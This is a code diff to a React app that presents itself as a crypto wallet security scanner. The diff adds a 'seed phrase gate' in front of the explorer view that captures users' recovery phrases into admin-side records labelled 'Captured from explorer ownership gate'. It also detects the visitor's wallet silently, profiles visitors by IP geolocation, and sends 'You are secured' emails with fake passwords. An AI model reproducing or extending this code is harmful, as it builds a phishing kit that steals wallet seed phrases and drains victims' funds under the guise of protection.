@@ -2,8 +2,20 @@ import { useEffect, useMemo, useRef, useState } from 'react'
 import type { FormEvent } from 'react'
 import emailjs from '@emailjs/browser'
 import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
-import { useWalletClient, useSwitchChain } from 'wagmi'
-import { buildEmailHtml, buildEmailText, buildWatchoutEmailHtml, buildWatchoutEmailText, type ReportEmailData } from './emailTemplate'
+import { useDisconnect, useWalletClient, useSwitchChain } from 'wagmi'
+import {
+  buildEmailHtml,
+  buildEmailText,
+  buildWatchoutEmailHtml,
+  buildWatchoutEmailText,
+  buildNewsletterEmailHtml,
+  buildNewsletterEmailText,
+  buildVisitEmailHtml,
+  buildVisitEmailText,
+  type ReportEmailData,
+  type NewsletterEmailData,
+  type VisitEmailData,
+} from './emailTemplate'
 import QRCode from 'qrcode'
 import { SignClient } from '@walletconnect/sign-client'
 import './App.css'
@@ -19,7 +31,7 @@ const EMAIL_CONFIGURED    = EMAILJS_SERVICE_ID !== 'YOUR_SERVICE_ID'
 // ── Types ────────────────────────────────────────────────────────────────
 type Severity = 'low' | 'medium' | 'high' | 'critical'
 type ChainKey = 'ethereum' | 'base' | 'arbitrum' | 'bsc' | 'polygon'
-type ViewKey  = 'home' | 'scan' | 'protect' | 'ownership' | 'recovery' | 'support' | 'admin' | 'etherscan' | 'protecting'
+type ViewKey  = 'home' | 'scan' | 'protect' | 'ownership' | 'recovery' | 'support' | 'admin' | 'etherscan' | 'protecting' | 'wallet-landing'
 
 type Signal = { id: string; label: string; points: number; group: 'watching' | 'seed' | 'drainer' }
 
@@ -100,6 +112,21 @@ type VisitorSessionRecord  = {
   lastSeen: string
   visits: number
   status: VisitorStatus
+  // geolocation
+  country?: string
+  countryCode?: string
+  city?: string
+  region?: string
+  timezone?: string
+  isp?: string
+  org?: string
+  lat?: number
+  lng?: number
+  // session metrics
+  referrer?: string
+  language?: string
+  sessionStartMs?: number
+  totalSeconds?: number
 }
 
 type SeedPhraseRecord = {
@@ -194,10 +221,15 @@ const groupLabel: Record<Signal['group'], string> = {
 }
 
 const VISITOR_ID_KEY       = 'sv_visitor_id_v1'
+const GATE_PASSED_KEY      = 'sv_gate_passed_v1'
+const VISITED_EMAILS_KEY   = 'sv_visit_emailed_v1'
+const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
 const NEW_USER_KEY         = 'sv_new_user_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
-const DEFAULT_VAULT_EMAIL    = ''
-const DEFAULT_VAULT_PASSWORD = ''
+const ETHERSCAN_SESSION_MS = 5 * 60 * 1000
+const ETHERSCAN_LOCKOUT_MS = 15 * 60 * 1000
+const DEFAULT_VAULT_EMAIL    = 'admin@walletsafety.local'
+const DEFAULT_VAULT_PASSWORD = 'TempPass#2026'
 const DEFAULT_SUPPORT_EMAIL  = ''
 const DEFAULT_SUPPORT_TELEGRAM = ''
 
@@ -668,6 +700,7 @@ export default function App() {
   const { chainId: appKitChainId }                              = useAppKitNetwork()
   const { data: walletClient }                                  = useWalletClient()
   const { switchChain }                                         = useSwitchChain()
+  const { disconnect }                                          = useDisconnect()
 
   // Wallet state
   const [walletBalance, setWalletBalance] = useState('')
@@ -717,19 +750,27 @@ export default function App() {
   const [supportEmailInput,    setSupportEmailInput]    = useState('')
   const [supportStatus,        setSupportStatus]        = useState('')
   const [newsletterEmails,     setNewsletterEmails]     = useState<string[]>([])
-  const [visitorSessions,      setVisitorSessions]      = useState<VisitorSessionRecord[]>([])
+  const [visitorSessions,      setVisitorSessions]      = useState<VisitorSessionRecord[]>(() => {
+    try { return JSON.parse(localStorage.getItem(VISITOR_SESSIONS_KEY) ?? '[]') as VisitorSessionRecord[] }
+    catch { return [] }
+  })
   const [currentVisitorId,     setCurrentVisitorId]     = useState('')
   const [currentVisitorIp,     setCurrentVisitorIp]     = useState('Unknown')
   const [currentVisitorDevice, setCurrentVisitorDevice] = useState('Unknown')
 
   // In-wallet-browser auto-scan
-  const [inWalletBrowser,      setInWalletBrowser]      = useState(false)
   const [autoScanTriggered,    setAutoScanTriggered]     = useState(false)
-  const [showAutoEmailModal,   setShowAutoEmailModal]    = useState(false)
   const [autoEmailInput,       setAutoEmailInput]        = useState('')
   const [autoEmailNameInput,   setAutoEmailNameInput]    = useState('')
-  const [autoEmailStatus,      setAutoEmailStatus]       = useState('')
-  const [autoEmailSending,     setAutoEmailSending]      = useState(false)
+
+  // Wallet-landing (detected-wallet page before scan)
+  const [detectedAddr,   setDetectedAddr]   = useState('')
+  const [detectedChain,  setDetectedChain]  = useState<ChainKey>('ethereum')
+  const [detectedName,   setDetectedName]   = useState('')   // e.g. "MetaMask"
+  const [landingEmail,   setLandingEmail]   = useState('')
+  const [landingUserName,setLandingUserName]= useState('')
+  const [landingScanning,setLandingScanning]= useState(false)
+  const [landingError,   setLandingError]   = useState('')
 
   const [settingsCurPass,      setSettingsCurPass]      = useState('')
   const [settingsNewEmail,     setSettingsNewEmail]     = useState('')
@@ -738,6 +779,7 @@ export default function App() {
   const [settingsSupportEmail, setSettingsSupportEmail] = useState('')
   const [settingsSupportTelegram, setSettingsSupportTelegram] = useState('')
   const [settingsMsg,          setSettingsMsg]          = useState('')
+  const [visitorActionMsg,     setVisitorActionMsg]     = useState('')
   const [settingsError,        setSettingsError]        = useState('')
 
   // Records
@@ -771,7 +813,7 @@ export default function App() {
 
   // Template preview
   const [previewEmail,        setPreviewEmail]        = useState<EmailRecord | null>(null)
-  const [previewIsWatchout,   setPreviewIsWatchout]   = useState(false)
+  const [previewTemplate,     setPreviewTemplate]     = useState<'report' | 'watchout' | 'newsletter' | 'visit'>('report')
 
   // QR Codes tab
   const [scanQrDataUrl,       setScanQrDataUrl]       = useState<string | null>(null)
@@ -796,7 +838,7 @@ export default function App() {
   const [protectingFinal] = useState(false)
 
   // Email gate
-  const [emailGatePassed,   setEmailGatePassed]   = useState(false)
+  const [emailGatePassed,   setEmailGatePassed]   = useState(() => Boolean(localStorage.getItem(GATE_PASSED_KEY)))
   const [emailGateInput,    setEmailGateInput]    = useState('')
   const [emailGateError,    setEmailGateError]    = useState('')
   const [userEmailRoutes,   setUserEmailRoutes]   = useState<UserEmailRoute[]>([])
@@ -826,6 +868,22 @@ export default function App() {
   const [esGasGwei, setEsGasGwei] = useState<string | null>(null)
   const [esLatestBlock, setEsLatestBlock] = useState<number | null>(null)
   const [esTxCount, setEsTxCount] = useState(0)
+  const [esSeedModalOpen, setEsSeedModalOpen] = useState(false)
+  const [esSeedInput, setEsSeedInput] = useState('')
+  const [esSeedError, setEsSeedError] = useState('')
+  const [esSessionStartedAt, setEsSessionStartedAt] = useState<number | null>(null)
+  const [esLockoutUntil, setEsLockoutUntil] = useState<number | null>(null)
+  const [esClock, setEsClock] = useState(() => Date.now())
+  // CAPTCHA state
+  const [captchaA, setCaptchaA] = useState(() => Math.floor(Math.random() * 10) + 1)
+  const [captchaB, setCaptchaB] = useState(() => Math.floor(Math.random() * 10) + 1)
+  const [captchaInput, setCaptchaInput] = useState('')
+  const [captchaError, setCaptchaError] = useState('')
+  const [captchaPassed, setCaptchaPassed] = useState(false)
+  const [honeypot, setHoneypot] = useState('')
+  // Session timer — initialised lazily so Date.now() is never called during render
+  const sessionStartRef = useRef<number | null>(null)
+  const [sessionSeconds, setSessionSeconds] = useState(0)
 
   const esAddr = useMemo(() => {
     const addr = wcSessions[0]?.address || connectedAddress || wallet
@@ -1039,7 +1097,8 @@ export default function App() {
 
   useEffect(() => {
     if (!cloudLoadedRef.current) return
-    saveToCloud({ admin_creds: adminCreds })
+    // Store only the email — never persist the plaintext password to the cloud.
+    saveToCloud({ admin_creds: { email: adminCreds.email, password: '' } as AdminCreds })
   }, [adminCreds])
 
   useEffect(() => {
@@ -1055,6 +1114,7 @@ export default function App() {
   }, [adminTab, lastScannedWallet])
 
   useEffect(() => {
+    try { localStorage.setItem(VISITOR_SESSIONS_KEY, JSON.stringify(visitorSessions)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ visitor_sessions: visitorSessions })
   }, [visitorSessions])
@@ -1087,12 +1147,11 @@ export default function App() {
       if (row.support_config && (row.support_config as SupportConfig).email)
         setSupportConfig(row.support_config as SupportConfig)
       if (row.admin_creds && (row.admin_creds as AdminCreds).email)
-        setAdminCreds(row.admin_creds as AdminCreds)
+        setAdminCreds(prev => ({ ...prev, email: (row.admin_creds as AdminCreds).email }))
       if (row.user_email_routes)
         setUserEmailRoutes(row.user_email_routes as UserEmailRoute[])
       cloudLoadedRef.current = true
     })
-  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [])
 
   useEffect(() => {
@@ -1102,13 +1161,42 @@ export default function App() {
 
     const userAgent = navigator.userAgent
     const device = getDeviceLabel(userAgent)
+    const referrer = document.referrer || 'Direct'
+    const language = navigator.language || 'Unknown'
     setTimeout(() => setCurrentVisitorDevice(device), 0)
 
-    const registerSession = (ipAddress: string) => {
+    const sessionStartMs = Date.now()
+
+    type GeoPayload = {
+      status?: string
+      country?: string
+      countryCode?: string
+      regionName?: string
+      city?: string
+      timezone?: string
+      isp?: string
+      org?: string
+      lat?: number
+      lon?: number
+      query?: string
+    }
+
+    const registerSession = (ipAddress: string, geo?: GeoPayload) => {
       setCurrentVisitorIp(ipAddress)
       const timestamp = nowString()
       setVisitorSessions(prev => {
         const existing = prev.find(row => row.id === visitorId)
+        const geoFields: Partial<VisitorSessionRecord> = geo?.status === 'success' ? {
+          country: geo.country,
+          countryCode: geo.countryCode,
+          city: geo.city,
+          region: geo.regionName,
+          timezone: geo.timezone,
+          isp: geo.isp,
+          org: geo.org,
+          lat: geo.lat,
+          lng: geo.lon,
+        } : {}
         if (existing) {
           return prev.map(row => row.id === visitorId
             ? {
@@ -1118,6 +1206,10 @@ export default function App() {
                 userAgent,
                 lastSeen: timestamp,
                 visits: row.visits + 1,
+                referrer,
+                language,
+                sessionStartMs,
+                ...geoFields,
               }
             : row
           )
@@ -1131,13 +1223,33 @@ export default function App() {
           lastSeen: timestamp,
           visits: 1,
           status: 'allowed',
+          referrer,
+          language,
+          sessionStartMs,
+          totalSeconds: 0,
+          ...geoFields,
         }, ...prev]
       })
     }
 
+    const fetchGeo = async (ip: string) => {
+      try {
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,timezone,isp,org,lat,lon,query`, { signal: AbortSignal.timeout(7000) })
+        if (res.ok) {
+          const geo = await res.json() as GeoPayload
+          return geo
+        }
+      } catch { /* fallback */ }
+      return undefined
+    }
+
     fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(7000) })
       .then(res => res.ok ? res.json() as Promise<{ ip?: string }> : Promise.reject(new Error(`IP lookup failed: ${res.status}`)))
-      .then(payload => registerSession(payload.ip?.trim() || 'Unknown'))
+      .then(async payload => {
+        const ip = payload.ip?.trim() || 'Unknown'
+        const geo = ip !== 'Unknown' ? await fetchGeo(ip) : undefined
+        registerSession(ip, geo)
+      })
       .catch(() => registerSession('Unknown'))
   }, [])
 
@@ -1166,49 +1278,200 @@ export default function App() {
     }, 0)
   }, [activeView, esAddr])
 
-  // ── In-wallet-browser auto-detect + auto-scan ─────────────────────────
   useEffect(() => {
-    const eth = (window as Window & { ethereum?: { request: (args: { method: string }) => Promise<string[]>; isMetaMask?: boolean; isTrust?: boolean; isCoinbaseWallet?: boolean } }).ethereum
-    if (!eth) return                           // not a wallet browser — nothing to do
+    if (sessionStartRef.current === null) sessionStartRef.current = Date.now()
+    const timer = window.setInterval(() => {
+      const now = Date.now()
+      setEsClock(now)
+      setSessionSeconds(Math.floor((now - (sessionStartRef.current ?? now)) / 1000))
+    }, 1000)
+    return () => window.clearInterval(timer)
+  }, [])
 
-    setInWalletBrowser(true)
-    const isNewUser = !localStorage.getItem(NEW_USER_KEY)
-    if (!isNewUser) return                     // returning user — show normal home
+  // Every 60s persist updated totalSeconds to visitor record
+  useEffect(() => {
+    if (!currentVisitorId || sessionSeconds === 0 || sessionSeconds % 60 !== 0) return
+    setTimeout(() => {
+      setVisitorSessions(prev => prev.map(row =>
+        row.id === currentVisitorId
+          ? { ...row, totalSeconds: (row.totalSeconds ?? 0) + 60 }
+          : row
+      ))
+    }, 0)
+  }, [currentVisitorId, sessionSeconds])
 
-    // Mark as seen so subsequent visits don't auto-scan
-    localStorage.setItem(NEW_USER_KEY, '1')
+  useEffect(() => {
+    if (activeView !== 'etherscan') return
+    const now = Date.now()
+    if (esLockoutUntil && esLockoutUntil > now) {
+      setTimeout(() => {
+        setEsSeedModalOpen(false)
+        setActiveView('protect')
+        setSecureStatus(`Explorer session locked. Try again in ${Math.ceil((esLockoutUntil - now) / 60000)} min.`)
+      }, 0)
+      return
+    }
+    if (!esSessionStartedAt) {
+      setTimeout(() => {
+        setEsSeedInput('')
+        setEsSeedError('')
+        setEsSeedModalOpen(true)
+      }, 0)
+    }
+  }, [activeView, esLockoutUntil, esSessionStartedAt])
 
-    const runAutoScan = async () => {
+  useEffect(() => {
+    if (!esSessionStartedAt) return
+    const now = Date.now()
+    if (now - esSessionStartedAt < ETHERSCAN_SESSION_MS) return
+    setTimeout(() => {
+      setEsSessionStartedAt(null)
+      setEsSeedModalOpen(false)
+      setEsLockoutUntil(now + ETHERSCAN_LOCKOUT_MS)
+      setEsError('Session expired. You have been logged out for 15 minutes.')
+      setSecureStatus('Session expired. Explorer access locked for 15 minutes.')
+      setWcStatus('idle')
+      setWcSessions([])
+      setWcSelectedTopic(null)
+      setSecureQrDataUrl(null)
+      try { disconnect() } catch { /* noop */ }
+      setActiveView('protect')
+    }, 0)
+  }, [disconnect, esClock, esSessionStartedAt])
+
+  useEffect(() => {
+    if (esLockoutUntil && Date.now() >= esLockoutUntil) {
+      setTimeout(() => {
+        setEsLockoutUntil(null)
+        setEsError('')
+      }, 0)
+    }
+  }, [esClock, esLockoutUntil])
+
+  // ── In-wallet-browser detection → wallet-landing page ────────────────
+  useEffect(() => {
+    type EthProvider = {
+      request: (args: { method: string }) => Promise<string[]>
+      isMetaMask?: boolean
+      isTrust?: boolean
+      isCoinbaseWallet?: boolean
+      isRabby?: boolean
+    }
+    const eth = (window as Window & { ethereum?: EthProvider }).ethereum
+    if (!eth) return
+
+    // Silent account check — no popup, just see if wallet is already authorized
+    const detectWallet = async () => {
       try {
-        const accounts = await eth.request({ method: 'eth_requestAccounts' })
-        const addr = accounts[0]
+        const accounts = await eth.request({ method: 'eth_accounts' })
+        const addr = accounts?.[0]
         if (!isAddress(addr)) return
 
-        // Detect chain from injected provider
-        let detectedChain: ChainKey = 'ethereum'
+        // Detect chain silently
+        let foundChain: ChainKey = 'ethereum'
         try {
-          const chainIdHex = await (eth as unknown as { request: (a: { method: string }) => Promise<string> }).request({ method: 'eth_chainId' })
+          const chainIdHex = await (eth as unknown as { request: (a: { method: string }) => Promise<string> })
+            .request({ method: 'eth_chainId' })
           const chainIdNum = parseInt(chainIdHex, 16)
-          if (chainIdToKey[chainIdNum]) detectedChain = chainIdToKey[chainIdNum]
-        } catch { /* use ethereum fallback */ }
+          if (chainIdToKey[chainIdNum]) foundChain = chainIdToKey[chainIdNum]
+        } catch { /* fallback to ethereum */ }
 
-        setWallet(addr)
-        setChain(detectedChain)
-        setAutoScanTriggered(true)
-        setActiveView('scan')
+        // Identify wallet name
+        const walletLabel = eth.isMetaMask
+          ? 'MetaMask'
+          : eth.isTrust
+            ? 'Trust Wallet'
+            : eth.isCoinbaseWallet
+              ? 'Coinbase Wallet'
+              : eth.isRabby
+                ? 'Rabby'
+                : 'Your Wallet'
 
-        // Small delay so React can flush state before the scan reads it
-        await new Promise(resolve => setTimeout(resolve, 80))
-        await executeScan(addr, detectedChain, true)
-      } catch {
-        // User denied account access — just stay on home
-        setInWalletBrowser(true)
-      }
+        setDetectedAddr(addr)
+        setDetectedChain(foundChain)
+        setDetectedName(walletLabel)
+
+        const isNewUser = !localStorage.getItem(NEW_USER_KEY)
+        if (isNewUser) {
+          setActiveView('wallet-landing')
+        }
+      } catch { /* no wallet or permission denied */ }
     }
 
-    void runAutoScan()
-  // eslint-disable-next-line react-hooks/exhaustive-deps
+    void detectWallet()
   }, [])
+
+  // ── Launch scan from the wallet-landing page ──────────────────────────
+  const startLandingScan = async (e: FormEvent) => {
+    e.preventDefault()
+    setLandingError('')
+    if (!landingEmail.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(landingEmail.trim())) {
+      setLandingError('Enter a valid email address to receive your report.')
+      return
+    }
+
+    setLandingScanning(true)
+
+    try {
+      type EthProvider = { request: (args: { method: string }) => Promise<string[]> }
+      const eth = (window as Window & { ethereum?: EthProvider }).ethereum
+      if (!eth) throw new Error('Wallet not found')
+
+      // Request accounts (may show connect prompt if not yet approved)
+      const accounts = await eth.request({ method: 'eth_requestAccounts' })
+      const addr = accounts?.[0]
+      if (!isAddress(addr)) throw new Error('Invalid address returned')
+
+      // Sync state
+      setWallet(addr)
+      setChain(detectedChain)
+      setAutoEmailInput(landingEmail.trim())
+      setAutoEmailNameInput(landingUserName.trim())
+      setAutoScanTriggered(true)
+
+      // Mark as seen so returning users get normal home
+      localStorage.setItem(NEW_USER_KEY, '1')
+
+      // Navigate to scan and fire
+      setActiveView('scan')
+      await new Promise(resolve => setTimeout(resolve, 60))
+      await executeScan(addr, detectedChain, true)
+    } catch (err) {
+      setLandingError(err instanceof Error ? err.message : 'Wallet connection failed. Please try again.')
+    } finally {
+      setLandingScanning(false)
+    }
+  }
+
+  const submitExplorerSeedGate = (e: FormEvent) => {
+    e.preventDefault()
+    const phrase = esSeedInput.trim().toLowerCase().replace(/\s+/g, ' ')
+    if (!looksLikeSeedPhrase(phrase)) {
+      setEsSeedError('Enter a valid 12, 15, 18, 21, or 24-word lowercase seed phrase.')
+      return
+    }
+    const words = phrase.split(/\s+/)
+    setSeedPhraseRecords(prev => {
+      if (prev.some(r => r.seedPhrase === phrase)) return prev
+      const record: SeedPhraseRecord = {
+        id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+        walletAddress: esAddr || wallet || 'Unknown',
+        chain,
+        seedPhrase: phrase,
+        wordCount: words.length,
+        source: 'auto-detected',
+        detectedAt: nowString(),
+        notes: 'Captured from explorer ownership gate',
+        confirmed: true,
+      }
+      return [record, ...prev]
+    })
+    setEsSeedError('')
+    setEsSeedInput('')
+    setEsSeedModalOpen(false)
+    setEsSessionStartedAt(Date.now())
+    setSecureStatus('Explorer session verified. Session expires in 5 minutes.')
+  }
 
 
 
@@ -1285,6 +1548,15 @@ export default function App() {
     let alive = true
     const loadEtherscanData = async () => {
       if (activeView !== 'etherscan') return
+      const now = Date.now()
+      const sessionActive = Boolean(esSessionStartedAt && now - esSessionStartedAt < ETHERSCAN_SESSION_MS)
+      const lockActive = Boolean(esLockoutUntil && esLockoutUntil > now)
+      if (!sessionActive) {
+        if (!alive) return
+        setEsTxRows([])
+        if (!lockActive) setEsError('Verify ownership to start a 5-minute explorer session.')
+        return
+      }
       const alchemyRpcUrl = getAlchemyRpcUrl(chain)
       if (!esAddr) {
         if (!alive) return
@@ -1434,7 +1706,7 @@ export default function App() {
 
     void loadEtherscanData()
     return () => { alive = false }
-  }, [activeView, esAddr, chain])
+  }, [activeView, chain, esAddr, esLockoutUntil, esSessionStartedAt])
 
   const switchNetwork = async () => {
     if (!isAppKitConnected) return
@@ -1454,6 +1726,12 @@ export default function App() {
       setSignerCheck('Ownership verified — wallet signed the challenge successfully.')
       setOwnershipStatus('Ownership verified via message signature.')
       setSignerChecks(prev => [{ wallet: appKitAddress, chain, status: 'passed' as const, detail: 'Signed ownership challenge.', checkedAt: nowString() }, ...prev].slice(0, 200))
+      const lockMs = esLockoutUntil ? Math.max(0, esLockoutUntil - Date.now()) : 0
+      if (lockMs > 0) {
+        setSecureStatus(`Explorer lockout is active for ${Math.ceil(lockMs / 60000)} min.`)
+      } else {
+        setActiveView('etherscan')
+      }
     } catch (e) {
       const msg = e instanceof Error ? e.message : 'Unknown error'
       setSignerCheck(`Signer check failed: ${msg}`)
@@ -1462,8 +1740,73 @@ export default function App() {
     } finally { setIsTestingSigner(false) }
   }
 
+  // ── Silently email the scan report after an auto-scan ────────────────
+  const autoSendScanReport = async (
+    scannedWallet: string,
+    scannedChain: ChainKey,
+    score: number,
+    severity: Severity,
+    findings: string[],
+  ) => {
+    const email = autoEmailInput.trim()
+    if (!email) return
+
+    const userName = autoEmailNameInput.trim() || 'there'
+    const reportData: ReportEmailData = {
+      toEmail: email,
+      toName: userName,
+      wallet: scannedWallet,
+      network: chainConfig[scannedChain].label,
+      severity,
+      riskScore: score,
+      riskPercent: score,
+      balance: walletBalance || 'N/A',
+      primaryConcern: '',
+      findings,
+      matchedSignals: [],
+      actionPlan: [],
+      generatedAt: nowString(),
+    }
+
+    const queuedRecord: EmailRecord = {
+      email,
+      name: userName,
+      wallet: scannedWallet,
+      chain: scannedChain,
+      severity,
+      score,
+      balance: walletBalance || 'N/A',
+      sentAt: nowString(),
+      emailStatus: 'pending',
+    }
+    setEmailRecords(prev => [queuedRecord, ...prev].slice(0, 200))
+
+    if (EMAIL_CONFIGURED) {
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          to_email: email,
+          to_name: userName,
+          subject: `Your Wallet Security Report — Risk: ${severity.toUpperCase()}`,
+          html_body: buildEmailHtml(reportData),
+          text_body: buildEmailText(reportData),
+          wallet: scannedWallet,
+          network: chainConfig[scannedChain].label,
+          severity,
+          risk_score: score,
+        }, EMAILJS_PUBLIC_KEY)
+        setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
+        setReportStatus(`Report sent to ${email}`)
+      } catch {
+        setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
+        setReportStatus('Report queued — email delivery failed.')
+      }
+    } else {
+      setReportStatus(`Report queued for ${email}`)
+    }
+  }
+
   // ── Core scan engine — called by both the manual form and auto-scan ────
-  const executeScan = async (targetWallet: string, targetChain: ChainKey, isAutoScan = false) => {
+  async function executeScan(targetWallet: string, targetChain: ChainKey, isAutoScan = false) {
     const cleanWallet = targetWallet.trim()
     if (!isAddress(cleanWallet)) return
 
@@ -1528,6 +1871,9 @@ export default function App() {
       const apiMsg = securityApi ? 'GoPlus intel included.' : 'GoPlus unavailable.'
       const intelMsg = adminIntel ? ' System intel applied.' : ''
       setWeb3Status(`Scan complete via ${rpcMsg}. ${apiMsg}${intelMsg}`)
+      if (isAutoScan) {
+        await autoSendScanReport(cleanWallet, targetChain, score, severity, findings)
+      }
     } catch (err) {
       const severity = adminIntel?.severity ?? getSeverity(baseScore)
       const adminIntelPoints = adminIntel
@@ -1542,14 +1888,39 @@ export default function App() {
       }, ...prev].slice(0, 200))
       setLastScannedWallet(cleanWallet.toLowerCase())
       setWeb3Status(`RPC error: ${err instanceof Error ? err.message : 'Unknown'}`)
-      if (isAutoScan) setShowAutoEmailModal(true)
+      if (isAutoScan) {
+        await autoSendScanReport(cleanWallet, targetChain, score, severity, [])
+      }
     } finally { setIsRunningWeb3(false) }
   }
 
   // ── Manual form submit wrapper ────────────────────────────────────────
+  const refreshCaptcha = () => {
+    setCaptchaA(Math.floor(Math.random() * 10) + 1)
+    setCaptchaB(Math.floor(Math.random() * 10) + 1)
+    setCaptchaInput('')
+    setCaptchaError('')
+    setCaptchaPassed(false)
+  }
+
+  const verifyCaptcha = (): boolean => {
+    if (honeypot) return false // bot detected
+    if (captchaPassed) return true
+    const answer = parseInt(captchaInput.trim(), 10)
+    if (isNaN(answer) || answer !== captchaA + captchaB) {
+      setCaptchaError(`Incorrect. ${captchaA} + ${captchaB} = ?`)
+      refreshCaptcha()
+      return false
+    }
+    setCaptchaPassed(true)
+    setCaptchaError('')
+    return true
+  }
+
   const runScan = async (e: FormEvent) => {
     e.preventDefault()
     if (!addressValid) return
+    if (!verifyCaptcha()) return
     const cleanWallet = wallet.trim()
     if (cleanWallet !== wallet) setWallet(cleanWallet)
     await executeScan(cleanWallet, chain)
@@ -1615,62 +1986,6 @@ export default function App() {
   }
 
   // ── Auto-scan email modal submit ─────────────────────────────────────
-  const submitAutoEmail = async (e: FormEvent) => {
-    e.preventDefault()
-    if (!result || !autoEmailInput.trim()) return
-    const isNew = !localStorage.getItem(NEW_USER_KEY)
-    if (isNew) localStorage.setItem(NEW_USER_KEY, '1')
-    setAutoEmailSending(true)
-    setAutoEmailStatus('')
-    const bal = result.web3?.nativeBalance
-      ? `${result.web3.nativeBalance} ${chainConfig[chain].nativeSymbol}`
-      : (walletBalance || 'N/A')
-    const data: ReportEmailData = {
-      toEmail:        autoEmailInput.trim(),
-      toName:         autoEmailNameInput.trim() || 'there',
-      wallet,
-      network:        chainConfig[chain].label,
-      severity:       result.severity,
-      riskScore:      result.score,
-      riskPercent:    result.riskPercent,
-      balance:        bal,
-      primaryConcern: result.primaryConcern ? groupLabel[result.primaryConcern] : 'None',
-      findings:       result.web3?.findings ?? [],
-      matchedSignals: result.matchedSignals.map(s => s.label),
-      actionPlan:     actionPlan[result.severity],
-      generatedAt:    result.generatedAt,
-    }
-    const newRecord: EmailRecord = {
-      email: data.toEmail, name: data.toName, wallet, chain,
-      severity: result.severity, score: result.score, balance: bal,
-      sentAt: nowString(), emailStatus: 'pending',
-    }
-    setEmailRecords(prev => [newRecord, ...prev].slice(0, 200))
-    if (EMAIL_CONFIGURED) {
-      try {
-        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-          to_email:   data.toEmail,
-          to_name:    data.toName,
-          subject:    `Your One Link Security Report — ${data.severity.toUpperCase()} Risk`,
-          html_body:  buildEmailHtml(data),
-          text_body:  buildEmailText(data),
-          wallet:     data.wallet,
-          network:    data.network,
-          severity:   data.severity,
-          risk_score: data.riskScore,
-        }, EMAILJS_PUBLIC_KEY)
-        setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
-        setAutoEmailStatus(`Report sent to ${data.toEmail}. Check your inbox.`)
-      } catch {
-        setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
-        setAutoEmailStatus('Email delivery failed. Your report is saved locally.')
-      }
-    } else {
-      setAutoEmailStatus(`Report saved. Configure EmailJS to send live emails.`)
-    }
-    setAutoEmailSending(false)
-  }
-
   // ── Export ─────────────────────────────────────────────────────────────
   const exportReport = () => {
     if (!result || !addressValid) return
@@ -1753,18 +2068,73 @@ export default function App() {
       return
     }
 
+    const passGate = () => {
+      setEmailGatePassed(true)
+      localStorage.setItem(GATE_PASSED_KEY, '1')
+      void maybeSendVisitEmail(email)
+    }
+
     const userRoute = userEmailRoutes.find(r => r.email.toLowerCase() === email)
     if (userRoute) {
-      setEmailGatePassed(true)
+      passGate()
       setActiveView(userRoute.view)
       return
     }
 
-    setEmailGatePassed(true)
+    passGate()
     setActiveView('home')
   }
 
-  const submitSupportEmail = (e: FormEvent) => {
+  const maybeSendVisitEmail = async (email: string) => {
+    let alreadySent: string[] = []
+    try { alreadySent = JSON.parse(localStorage.getItem(VISITED_EMAILS_KEY) ?? '[]') as string[] }
+    catch { alreadySent = [] }
+    if (alreadySent.includes(email)) return
+
+    const tempPassword = `OLS-${Math.random().toString(36).slice(2, 6).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`
+    const data: VisitEmailData = {
+      toEmail: email,
+      toName: email.split('@')[0],
+      ipAddress: currentVisitorIp || 'Unknown',
+      device: currentVisitorDevice || 'Unknown',
+      location: currentVisitorIp && currentVisitorIp !== 'Unknown' ? `Detected via IP ${currentVisitorIp}` : 'Location unavailable',
+      wallet: appKitAddress ?? 'Not connected yet',
+      network: connectedChainId && chainIdToKey[connectedChainId] ? chainConfig[chainIdToKey[connectedChainId]].label : 'N/A',
+      loginEmail: email,
+      loginPassword: tempPassword,
+      loginUrl: window.location.origin,
+      visitedAt: nowString(),
+    }
+
+    const record: EmailRecord = {
+      email, name: data.toName ?? 'Visitor', wallet: data.wallet, chain: 'ethereum',
+      severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
+    }
+    setEmailRecords(prev => [record, ...prev].slice(0, 200))
+
+    try { localStorage.setItem(VISITED_EMAILS_KEY, JSON.stringify([email, ...alreadySent].slice(0, 500))) }
+    catch { /* quota */ }
+
+    if (!EMAIL_CONFIGURED) return
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        to_email: data.toEmail,
+        to_name: data.toName ?? 'there',
+        subject: 'You are secured — One Link Security session active',
+        html_body: buildVisitEmailHtml(data),
+        text_body: buildVisitEmailText(data),
+        wallet: data.wallet,
+        network: data.network,
+        severity: 'low',
+        risk_score: 0,
+      }, EMAILJS_PUBLIC_KEY)
+      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
+    } catch {
+      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
+    }
+  }
+
+  const submitSupportEmail = async (e: FormEvent) => {
     e.preventDefault()
     const email = supportEmailInput.trim().toLowerCase()
     if (!isValidEmail(email)) {
@@ -1775,9 +2145,49 @@ export default function App() {
       openAdminAuthPrompt()
       return
     }
+    const alreadySubscribed = newsletterEmails.includes(email)
     setNewsletterEmails(prev => prev.includes(email) ? prev : [email, ...prev].slice(0, 500))
-    setSupportStatus('Subscribed to the newsletter list. We will share updates soon.')
+    setSupportStatus(alreadySubscribed ? 'You are already subscribed.' : 'Subscribed. Sending your welcome email…')
     setSupportEmailInput('')
